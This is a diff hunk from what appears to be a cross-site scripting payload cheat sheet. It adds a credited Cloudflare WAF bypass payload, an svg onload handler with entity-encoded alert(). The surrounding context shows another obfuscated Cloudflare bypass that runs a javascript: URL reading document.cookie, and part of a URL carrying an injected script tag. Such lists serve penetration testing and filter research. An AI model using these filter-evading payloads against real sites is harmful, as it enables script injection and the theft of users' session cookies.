@@ -2411,6 +2411,11 @@ http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3csc
 ``` 
 
 ### Cloudflare
+- XSS Bypass by [@RakeshMane10](https://twitter.com/rakeshmane10)
+```
+<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+```
+
 - XSS Bypass by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
 ```
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>`
